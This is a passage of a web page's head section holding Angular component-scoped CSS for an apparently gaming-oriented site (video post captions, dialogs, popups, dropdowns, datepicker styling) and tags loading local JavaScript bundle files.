            font-family: Montserrat;
            font-size: 16px;
            font-weight: 600;
            font-stretch: normal;
            font-style: normal;
            line-height: 1.5;
            letter-spacing: normal;
            color: #fff;
            margin: 16px 0;
            overflow: hidden;
            -webkit-box-orient: vertical;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            text-overflow: ellipsis
        }

        @media (max-width:767px) {
            article[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] {
                width: 100%
            }
            article[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .event-item .date {
                color: #b4b4c0 !important;
                font-size: 10px
            }
            article[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .event-item small {
                margin: 2px 0 0 7px
            }
            article[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .date.show-xs[_ngcontent-gtc-c16] {
                display: block;
                color: #b4b4c0 !important
            }
            article[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .title[_ngcontent-gtc-c16] {
                font-size: 14px;
                margin: 0 0 10px
            }
            .latest-content-video__post[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .event-item .date {
                color: #b4b4c0 !important;
                font-size: 10px
            }
            .latest-content-video__post[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .event-item small {
                margin: 2px 0 0 7px
            }
        }

        article[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .content[_ngcontent-gtc-c16] {
            font-family: Montserrat;
            font-size: 16px;
            font-weight: 400;
            font-stretch: normal;
            font-style: normal;
            line-height: 1.5;
            letter-spacing: normal;
            color: #b4b4c0;
            overflow: hidden;
            -webkit-box-orient: vertical;
            display: -webkit-box;
            -webkit-line-clamp: 3;
            text-overflow: ellipsis
        }

        .latest-content-video__post[_ngcontent-gtc-c16] {
            position: relative;
            height: 361px;
            background-size: cover;
            background-position: top center;
            background-repeat: no-repeat;
            margin-bottom: 15px;
            border-radius: 4px
        }

        .latest-content-video__post[_ngcontent-gtc-c16]:before {
            content: '';
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            border-radius: 4px;
            background-image: linear-gradient(to bottom, transparent, transparent 30%, #161619 98%)
        }

        .latest-content-video__post[_ngcontent-gtc-c16] .caption-small[_ngcontent-gtc-c16] {
            position: absolute;
            bottom: 10px;
            left: 0;
            right: 0;
            padding: 15px;
            z-index: 9
        }

        .latest-content-video__post[_ngcontent-gtc-c16] .caption-small[_ngcontent-gtc-c16] span[_ngcontent-gtc-c16] {
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            text-transform: uppercase
        }

        .latest-content-video__post[_ngcontent-gtc-c16] .caption-small[_ngcontent-gtc-c16] h3[_ngcontent-gtc-c16] {
            margin: 20px 0 0;
            font-family: Montserrat;
            color: #fff;
            font-size: 1.1em;
            font-weight: 600;
            line-height: 1.5;
            letter-spacing: 1px
        }

        .latest-content-video__post[_ngcontent-gtc-c16] .live[_ngcontent-gtc-c16] {
            margin: 15px;
            position: relative;
            display: inline-block;
            padding: 5px 10px 5px 20px;
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #d0021b;
            text-transform: uppercase;
            border-radius: 5px
        }

        .latest-content-video__post[_ngcontent-gtc-c16] .live[_ngcontent-gtc-c16] span[_ngcontent-gtc-c16] {
            position: relative
        }

        .latest-content-video__post[_ngcontent-gtc-c16] .live[_ngcontent-gtc-c16] span[_ngcontent-gtc-c16]::before {
            position: absolute;
            content: "";
            height: 4px;
            width: 4px;
            display: inline-block;
            overflow: hidden;
            border-radius: 100%;
            left: -10px;
            top: 5px;
            background: #fff
        }

        .latest-content-video__post[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] {
            position: absolute;
            bottom: 10px;
            left: 0;
            right: 0;
            padding: 24px 24px 15px;
            z-index: 9
        }

        .latest-content-video__post[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .event-item .date {
            color: #b4b4c0 !important;
            font-size: 10px
        }

        .latest-content-video__post[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .event-item small {
            margin: 2px 0 0 7px
        }

        .latest-content-video__post[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .date[_ngcontent-gtc-c16] {
            padding: 4px 10px;
            margin-top: 10px;
            margin-right: 5px;
            overflow: hidden;
            border-radius: 5px;
            background: #161619;
            color: #fff;
            font-family: Montserrat;
            font-size: 12px;
            text-transform: uppercase
        }

        .latest-content-video__post[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .date[_ngcontent-gtc-c16] i[_ngcontent-gtc-c16] {
            font-size: 16px;
            margin-right: 6px
        }

        .latest-content-video__post[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] .date.style2[_ngcontent-gtc-c16] {
            background: 0 0;
            border-radius: 0;
            padding: 0;
            margin: 10px 0 0;
            line-height: 12px;
            font-size: 12px;
            text-transform: uppercase
        }

        .latest-content-video__post[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] span[_ngcontent-gtc-c16] {
            font-family: Montserrat;
            color: #fff;
            font-size: 12px;
            text-transform: uppercase
        }

        .latest-content-video__post[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] h3[_ngcontent-gtc-c16] {
            margin: 20px 0 15px;
            font-family: Montserrat;
            color: #fff;
            font-size: 16px;
            overflow: hidden;
            font-weight: 600;
            line-height: 1.5;
            letter-spacing: 1px;
            cursor: pointer;
            -webkit-box-orient: vertical;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            text-overflow: ellipsis
        }

        .latest-content-video__post[_ngcontent-gtc-c16] .caption[_ngcontent-gtc-c16] img[_ngcontent-gtc-c16] {
            width: 50px;
            position: absolute;
            top: 0;
            bottom: 200px;
            left: 0;
            right: 0;
            margin: auto
        }
    </style>
    <style>
        .mat-dialog-container {
            display: block;
            padding: 24px;
            border-radius: 4px;
            box-sizing: border-box;
            overflow: auto;
            outline: 0;
            width: 100%;
            height: 100%;
            min-height: inherit;
            max-height: inherit
        }

        @media (-ms-high-contrast:active) {
            .mat-dialog-container {
                outline: solid 1px
            }
        }

        .mat-dialog-content {
            display: block;
            margin: 0 -24px;
            padding: 0 24px;
            max-height: 65vh;
            overflow: auto;
            -webkit-overflow-scrolling: touch
        }

        .mat-dialog-title {
            margin: 0 0 20px;
            display: block
        }

        .mat-dialog-actions {
            padding: 8px 0;
            display: flex;
            flex-wrap: wrap;
            min-height: 52px;
            align-items: center;
            margin-bottom: -24px
        }

        .mat-dialog-actions[align=end] {
            justify-content: flex-end
        }

        .mat-dialog-actions[align=center] {
            justify-content: center
        }

        .mat-dialog-actions .mat-button+.mat-button,
        .mat-dialog-actions .mat-button+.mat-raised-button,
        .mat-dialog-actions .mat-raised-button+.mat-button,
        .mat-dialog-actions .mat-raised-button+.mat-raised-button {
            margin-left: 8px
        }

        [dir=rtl] .mat-dialog-actions .mat-button+.mat-button,
        [dir=rtl] .mat-dialog-actions .mat-button+.mat-raised-button,
        [dir=rtl] .mat-dialog-actions .mat-raised-button+.mat-button,
        [dir=rtl] .mat-dialog-actions .mat-raised-button+.mat-raised-button {
            margin-left: 0;
            margin-right: 8px
        }
    </style>
    <style>
        .popup-notification {
            background: 0 0;
            position: relative;
            width: auto
        }

        .popup-notification .mat-dialog-container {
            background: 0 0;
            padding: 0;
            height: unset !important;
            width: unset !important;
            overflow-y: hidden
        }

        .popup-notification__close-x {
            position: absolute;
            width: 100%;
            cursor: pointer;
            text-align: right;
            margin-left: 0;
            margin-top: 0
        }

        .popup-notification__close-x__border {
            background-color: rgba(0, 0, 0, .5);
            width: 30px;
            padding: 5px;
            display: inline-table;
            margin: 0 auto;
            margin-right: inherit;
            border-radius: 0 0 0 5px
        }

        .popup-notification__close-x__border img {
            width: 20px;
            height: 20px
        }

        .popup-notification__close-x-video {
            position: absolute;
            width: 100%;
            cursor: pointer;
            text-align: right;
            margin-left: 0;
            margin-top: -33px
        }

        .popup-notification__close-x-video__border {
            background-color: rgba(0, 0, 0, .5);
            width: 30px;
            padding: 5px;
            display: inline-table;
            margin: 0 auto;
            margin-right: inherit;
            border-radius: 5px
        }

        .popup-notification__close-x-video__border img {
            width: 20px;
            height: 20px
        }

        .popup-notification .imgNotif {
            width: 450px;
            height: 450px;
            cursor: pointer
        }

        @media only screen and (max-width:991px) {
            .popup-notification .imgNotif {
                width: 100%
            }
        }

        .popup-notification .fVideo {
            margin-top: 50px
        }

        .popup-notification .fVideo>iframe {
            width: 1002px;
            height: 464px
        }

        @media only screen and (min-device-width:320px) and (max-device-width:785px) {
            .popup-notification .fVideo>iframe {
                width: 80vw;
                height: 400px
            }
        }

        @media only screen and (min-device-width:768px) and (max-device-width:1024px) {
            .popup-notification .fVideo>iframe {
                width: 150vw;
                height: 400px
            }
        }

        @media only screen and (max-device-width:600px) {
            .popup-notification .popup-notification {
                width: 100%
            }
        }
    </style>
    <script charset="utf-8" src="32.4ce810b856ba85358c36.js"></script>
    <script charset="utf-8" src="48.bf94d02ca3916e7865ab.js"></script>
    <script charset="utf-8" src="31.731b1032bd80b16a45e3.js"></script>
    <script charset="utf-8" src="34.dce7750bd852261ed6ab.js"></script>
    <script charset="utf-8" src="33.8092465d5765decf5bde.js"></script>
    <script charset="utf-8" src="30.3ea7641def9fa8665a0d.js"></script>
    <script charset="utf-8" src="1.7bbb8e06dc4890ef0d0c.js"></script>
    <script charset="utf-8" src="7.4bd830ddf7e6de7fc305.js"></script>
    <script charset="utf-8" src="11.3940317a2619b9e4fdc6.js"></script>
    <script charset="utf-8" src="common.bfd6380fb1a9da17a2e4.js"></script>
    <script charset="utf-8" src="21.c2c28cdfb92f735af4e1.js"></script>
    <script charset="utf-8" src="4.4e4052b533539c686afa.js"></script>
    <script charset="utf-8" src="3.36e76300ca9f1a3a17a4.js"></script>
    <script charset="utf-8" src="2.b12c1e734de61d92b9cc.js"></script>
    <script charset="utf-8" src="5.366312517b24cb70454d.js"></script>
    <script charset="utf-8" src="46.ef8c5ce2737363224101.js"></script>
    <style>
        .justify-content-left[_ngcontent-gtc-c19] {
            justify-content: left !important
        }

        .justify-content-center[_ngcontent-gtc-c19] {
            justify-content: center !important
        }

        .justify-content-right[_ngcontent-gtc-c19] {
            justify-content: right !important
        }

        .justify-content-space-between[_ngcontent-gtc-c19] {
            justify-content: space-between !important
        }

        .justify-content-flex-end[_ngcontent-gtc-c19] {
            justify-content: flex-end !important
        }

        .text-decoration-line-through[_ngcontent-gtc-c19] {
            text-decoration: line-through !important
        }

        .text-decoration-underline[_ngcontent-gtc-c19] {
            text-decoration: underline !important
        }

        .text-decoration-overline[_ngcontent-gtc-c19] {
            text-decoration: overline !important
        }

        .text-decoration-none[_ngcontent-gtc-c19] {
            text-decoration: none !important
        }

        .align-self-center[_ngcontent-gtc-c19] {
            align-self: center
        }

        .cursor-no-drop[_ngcontent-gtc-c19] {
            cursor: no-drop !important
        }

        .cursor-pointer[_ngcontent-gtc-c19] {
            cursor: pointer !important
        }

        .text-left[_ngcontent-gtc-c19] {
            text-align: left !important
        }

        .text-center[_ngcontent-gtc-c19] {
            text-align: center !important
        }

        .text-right[_ngcontent-gtc-c19] {
            text-align: right !important
        }

        .text-justify[_ngcontent-gtc-c19] {
            text-align: justify !important
        }

        .v-align-top[_ngcontent-gtc-c19] {
            vertical-align: top !important
        }

        .v-align-middle[_ngcontent-gtc-c19] {
            vertical-align: middle !important
        }

        .v-align-bottom[_ngcontent-gtc-c19] {
            vertical-align: bottom !important
        }

        .float-left[_ngcontent-gtc-c19] {
            float: left !important
        }

        .float-right[_ngcontent-gtc-c19] {
            float: right !important
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c19] button.mat-icon-button[_ngcontent-gtc-c19] {
            position: absolute;
            right: 0;
            top: 25px;
            width: 24px;
            height: 24px;
            color: #6a707d
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c19] button.mat-icon-button[_ngcontent-gtc-c19] span.mat-button-wrapper[_ngcontent-gtc-c19],
        .mat-datepicker-toggle[_ngcontent-gtc-c19] button.mat-icon-button[_ngcontent-gtc-c19] span.mat-button-wrapper[_ngcontent-gtc-c19] svg.mat-datepicker-toggle-default-icon[_ngcontent-gtc-c19] {
            position: absolute;
            left: 0;
            top: 0;
            max-width: 24px;
            max-height: 24px
        }

        .cust-dropdown[_ngcontent-gtc-c19] {
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c19] i.fa-caret-down[_ngcontent-gtc-c19] {
            position: absolute;
            width: 9px;
            height: 15px;
            top: 0;
            bottom: 0;
            right: 5px;
            margin: auto
        }

        .cust-dropdown[_ngcontent-gtc-c19] input[type=text][_ngcontent-gtc-c19] {
            width: calc(100% - 10px);
            padding: 5px 10px;
            margin-right: 10px;
            background: 0 0;
            border: 0;
            outline: 0
        }

        .cust-dropdown[_ngcontent-gtc-c19] .cust-option[_ngcontent-gtc-c19] {
            display: none;
            position: absolute;
            min-width: 100%;
            top: 100%;
            background: #1d1f23;
            z-index: 99;
            padding: 15px 25px;
            box-shadow: 0 3px 8px 0 rgba(0, 0, 0, .35);
            border-radius: 3px
        }

        .cust-dropdown[_ngcontent-gtc-c19] .cust-option.active[_ngcontent-gtc-c19] {
            display: block
        }

        .cust-dropdown[_ngcontent-gtc-c19] .cust-option[_ngcontent-gtc-c19] ul.option-list[_ngcontent-gtc-c19] {
            margin: 0;
            padding: 0;
            list-style: none
        }

        .cust-dropdown[_ngcontent-gtc-c19] .cust-option[_ngcontent-gtc-c19] ul.option-list[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] {
            margin: 0;
            padding: 0;
            list-style: none;
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c19] .cust-option[_ngcontent-gtc-c19] ul.option-list[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] label[_ngcontent-gtc-c19] {
            display: block;
            margin: 0;
            padding: 10px 0 10px 30px
        }

        .cust-dropdown[_ngcontent-gtc-c19] .cust-option[_ngcontent-gtc-c19] ul.option-list[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] label[_ngcontent-gtc-c19]:before {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            top: 0;
            bottom: 0;
            left: 0;
            margin: auto;
            border: 1px solid #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c19] .cust-option[_ngcontent-gtc-c19] ul.option-list[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] label[_ngcontent-gtc-c19]:after {
            content: "";
            opacity: 0;
            position: absolute;
            width: 10px;
            height: 10px;
            top: 0;
            bottom: 0;
            left: 5px;
            margin: auto;
            border: 1px solid #fff;
            background: #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c19] .cust-option[_ngcontent-gtc-c19] ul.option-list[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] input[type=radio][_ngcontent-gtc-c19] {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            opacity: 0
        }

        .cust-dropdown[_ngcontent-gtc-c19] .cust-option[_ngcontent-gtc-c19] ul.option-list[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] input[type=radio][_ngcontent-gtc-c19]:checked+label[_ngcontent-gtc-c19]:after {
            opacity: 1
        }

        html[_ngcontent-gtc-c19] {
            scroll-behavior: smooth
        }

        body[_ngcontent-gtc-c19] {
            margin: 0;
            padding: 0;
            overflow-x: hidden !important
        }

        a[_ngcontent-gtc-c19],
        label[_ngcontent-gtc-c19],
        ol[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19],
        table[_ngcontent-gtc-c19] td[_ngcontent-gtc-c19],
        table[_ngcontent-gtc-c19] th[_ngcontent-gtc-c19],
        ul[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] {
            font-family: Montserrat
        }

        b[_ngcontent-gtc-c19] {
            font-family: Montserrat-Bold;
            font-weight: 800
        }

        h1[_ngcontent-gtc-c19],
        h2[_ngcontent-gtc-c19],
        h3[_ngcontent-gtc-c19],
        h4[_ngcontent-gtc-c19],
        h5[_ngcontent-gtc-c19],
        h6[_ngcontent-gtc-c19],
        p[_ngcontent-gtc-c19],
        span[_ngcontent-gtc-c19] {
            margin: 0;
            font-family: Montserrat
        }

        button[_ngcontent-gtc-c19] {
            outline: 0;
            font-family: Montserrat
        }

        input[_ngcontent-gtc-c19],
        textarea[_ngcontent-gtc-c19] {
            font-family: Montserrat;
            color: #fff
        }

        label.error-label[_ngcontent-gtc-c19] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: #d0021b;
            display: block
        }

        label.success-label[_ngcontent-gtc-c19] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: green;
            display: block
        }

        label.label-input[_ngcontent-gtc-c19] {
            display: block;
            font-family: Montserrat;
            font-size: 12px;
            color: #6a707d;
            margin-bottom: 10px
        }

        @media (max-width:767px) {
            label.label-input[_ngcontent-gtc-c19] {
                font-size: 11px
            }
        }

        label.label-media[_ngcontent-gtc-c19] {
            display: block;
            font-family: Montserrat;
            font-size: .8em;
            color: #6a707d;
            margin-bottom: 10px
        }

        .close-solid[_ngcontent-gtc-c19] {
            padding: 5px;
            height: 30px;
            width: 30px;
            background: 0 0;
            border: none;
            cursor: pointer
        }

        .close-solid[_ngcontent-gtc-c19] span[_ngcontent-gtc-c19] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .close-circle-wrap[_ngcontent-gtc-c19] {
            position: relative;
            float: right;
            margin-top: 20px;
            z-index: 1;
            background: 0 0;
            border: none
        }

        .close-circle-wrap[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            display: inline-block;
            vertical-align: middle;
            color: #fff;
            font-family: Montserrat-Bold;
            font-weight: 600;
            font-size: .9em;
            text-transform: uppercase
        }

        @media (max-width:767px) {
            .close-circle-wrap[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
                font-size: .75em
            }
        }

        .close-circle-wrap[_ngcontent-gtc-c19] p.close-circle[_ngcontent-gtc-c19] {
            height: 42px;
            width: 42px;
            background: 0 0;
            border: 2px solid #fff;
            cursor: pointer;
            padding: 12px;
            margin-left: 10px;
            border-radius: 100%;
            opacity: .5
        }

        .close-circle-wrap[_ngcontent-gtc-c19] p.close-circle[_ngcontent-gtc-c19] span[_ngcontent-gtc-c19] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .cta.cta--generate[_ngcontent-gtc-c19] {
            margin-top: 30px;
            padding: 16px 27px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: none;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c19] {
            text-decoration: none;
            padding: 10px 5px 10px 30px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid transparent;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c19] span[_ngcontent-gtc-c19] {
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #9c0114;
            padding: 5px 10px;
            display: inline-block;
            border-radius: 3px;
            margin: 0 10px
        }

        .cta.cta--border-transparent[_ngcontent-gtc-c19] {
            text-decoration: none;
            padding: 10px 40px;
            background: 0 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid #fff;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--transparent-white[_ngcontent-gtc-c19] {
            font-family: Montserrat;
            border: 1px solid #fff;
            padding: 15px 20px;
            border-radius: 4px;
            background: 0 0;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #fff;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        .cta.cta--solid-grey[_ngcontent-gtc-c19] {
            font-family: Montserrat;
            border: 1px solid transparent;
            padding: 15px 60px;
            border-radius: 4px;
            background: #2d2d30;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #6b6b6d;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        a.close-frame[_ngcontent-gtc-c19] {
            position: absolute;
            right: 30px;
            top: 0;
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            font-weight: 400;
            text-transform: uppercase;
            opacity: 1;
            z-index: 10
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c19] span[_ngcontent-gtc-c19] {
            padding: 4px 9px 4px 12px;
            border: 3px solid #6a707d;
            width: 42px;
            height: 42px;
            font-size: 20px;
            font-weight: 700;
            top: 16px
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            font-family: Montserrat;
            font-size: 13px;
            font-weight: 700;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.23;
            letter-spacing: 1.4px;
            text-align: center;
            color: #fff
        }

        a.close-frame[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            display: inline-block
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c19] {
                right: 10px
            }
            a.close-frame[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
                display: none
            }
        }

        a.close-frame[_ngcontent-gtc-c19] span[_ngcontent-gtc-c19] {
            margin-left: 10px;
            font-family: Montserrat;
            display: inline-block;
            width: 30px;
            height: 30px;
            padding: 5px 10px;
            border: 1px solid #6a707d;
            color: #6a707d;
            font-weight: 600;
            overflow: hidden;
            border-radius: 100%;
            position: relative;
            right: 0;
            top: 10px
        }

        .form-control[_ngcontent-gtc-c19] {
            position: relative;
            font-family: Montserrat !important;
            font-size: 1em;
            outline: 0;
            background: 0 0;
            border-radius: 0;
            box-shadow: none
        }

        .form-control.form-control--default[_ngcontent-gtc-c19] {
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--count[_ngcontent-gtc-c19] {
            text-align: center;
            margin: 0 10px 10px;
            width: 50px;
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--transparent[_ngcontent-gtc-c19] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 0;
            background: 0 0;
            border: none;
            box-shadow: none
        }

        .form-control.form-control--textarea[_ngcontent-gtc-c19] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 10px;
            border-radius: 4px;
            background-color: rgba(106, 112, 125, .19);
            border: none;
            box-shadow: none
        }

        .form-control[_ngcontent-gtc-c19]::-moz-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c19]::-ms-input-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c19]::placeholder {
            color: #69707e
        }

        .header-text[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19] {
            font-family: Montserrat-Bold;
            font-size: 2.3em;
            text-transform: capitalize;
            color: #fff
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c19] span[_ngcontent-gtc-c19] {
                right: 10px
            }
            .header-text[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19] {
                font-size: 1.5em
            }
        }

        .header-text[_ngcontent-gtc-c19] h4[_ngcontent-gtc-c19] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        .header-text[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .header-text-medium[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19] {
            font-family: Montserrat-Bold;
            font-size: 2em;
            color: #fff
        }

        .header-text-small[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-medium[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19],
            .header-text-small[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19] {
                font-size: 1.5em
            }
        }

        .header-text-extra-small[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19] {
            font-family: Montserrat;
            font-size: 1.2em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-extra-small[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19] {
                font-size: 1em
            }
        }

        .header-text-extra-small-bold[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19] {
            font-family: Montserrat-Bold;
            font-size: 1.2em;
            color: #fff
        }

        .body-text[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .description-text[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            font-size: 1em;
            color: #fff
        }

        .radio-input[_ngcontent-gtc-c19] {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            height: 100%;
            width: 100%;
            z-index: 9;
            opacity: 0
        }

        .middle-top[_ngcontent-gtc-c19] {
            margin: auto;
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            transform: translateY(-50%)
        }

        .fleft[_ngcontent-gtc-c19] {
            float: left
        }

        .fright[_ngcontent-gtc-c19] {
            float: right
        }

        .row[_ngcontent-gtc-c19] .padding-left-0[_ngcontent-gtc-c19] {
            padding-left: 0
        }

        .form-group.form-group--media[_ngcontent-gtc-c19] {
            position: relative;
            border-bottom: 1px solid #2b2e34
        }

        .dd-selected[_ngcontent-gtc-c19] {
            background: 0 0
        }

        .invalid-feedback[_ngcontent-gtc-c19] {
            text-align: left;
            position: relative;
            z-index: 1
        }

        .popup-shuffle[_ngcontent-gtc-c19] {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 99
        }

        .popup-shuffle[_ngcontent-gtc-c19]:before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: rgba(0, 0, 0, .8)
        }

        .popup-shuffle[_ngcontent-gtc-c19] .shuffle-container[_ngcontent-gtc-c19] {
            width: 400px;
            height: 120px;
            max-width: 90vw;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            margin: auto;
            border: 3px solid #6a707d;
            background: #1d1f23;
            border-radius: 4px;
            display: block
        }

        .popup-shuffle[_ngcontent-gtc-c19] .shuffle-container[_ngcontent-gtc-c19]>.row[_ngcontent-gtc-c19] {
            display: block;
            position: absolute;
            top: 50%;
            transform: translateY(-50%)
        }

        .popup-shuffle[_ngcontent-gtc-c19] .shuffle-container[_ngcontent-gtc-c19] .shuffle-pop-table[_ngcontent-gtc-c19] {
            display: table
        }

        .popup-shuffle[_ngcontent-gtc-c19] .shuffle-container[_ngcontent-gtc-c19] .shuffle-pop-table[_ngcontent-gtc-c19] .shuffle-pop-item[_ngcontent-gtc-c19] {
            display: table-cell;
            vertical-align: middle;
            width: 80%;
            padding-left: 20px
        }

        .popup-shuffle[_ngcontent-gtc-c19] .shuffle-container[_ngcontent-gtc-c19] .shuffle-pop-table[_ngcontent-gtc-c19] .shuffle-pop-item.img[_ngcontent-gtc-c19] {
            width: 20%;
            padding-left: 0
        }

        .popup-shuffle[_ngcontent-gtc-c19] .shuffle-container[_ngcontent-gtc-c19] img[_ngcontent-gtc-c19] {
            max-width: 100%
        }

        .popup-shuffle[_ngcontent-gtc-c19] .shuffle-container[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            color: #fff;
            font-size: 1em
        }

        .popup-shuffle[_ngcontent-gtc-c19] .shuffle-container[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] strong[_ngcontent-gtc-c19] {
            font-size: 1.09em
        }

        .mat-datepicker-content[_ngcontent-gtc-c19] {
            background: #1d1f23
        }

        .mat-calendar-body-cell-content[_ngcontent-gtc-c19] {
            color: #fff
        }

        .mat-calendar-body-disabled[_ngcontent-gtc-c19]>.mat-calendar-body-cell-content[_ngcontent-gtc-c19]:not(.mat-calendar-body-selected) {
            color: #616161
        }

        .mat-calendar-body-label[_ngcontent-gtc-c19],
        .mat-calendar-table-header[_ngcontent-gtc-c19] th[_ngcontent-gtc-c19],
        .mat-datepicker-content[_ngcontent-gtc-c19] .mat-calendar-next-button[_ngcontent-gtc-c19],
        .mat-datepicker-content[_ngcontent-gtc-c19] .mat-calendar-previous-button[_ngcontent-gtc-c19],
        .mat-datepicker-toggle[_ngcontent-gtc-c19],
        .mat-icon-button[disabled][disabled][_ngcontent-gtc-c19] {
            color: #fff
        }

        .mat-calendar-arrow[_ngcontent-gtc-c19] {
            border-top-color: #fff
        }

        .mat-calendar-header[_ngcontent-gtc-c19] {
            color: #fff
        }

        .cdk-keyboard-focused[_ngcontent-gtc-c19] .mat-calendar-body-active[_ngcontent-gtc-c19]>.mat-calendar-body-cell-content[_ngcontent-gtc-c19]:not(.mat-calendar-body-selected),
        .cdk-program-focused[_ngcontent-gtc-c19] .mat-calendar-body-active[_ngcontent-gtc-c19]>.mat-calendar-body-cell-content[_ngcontent-gtc-c19]:not(.mat-calendar-body-selected),
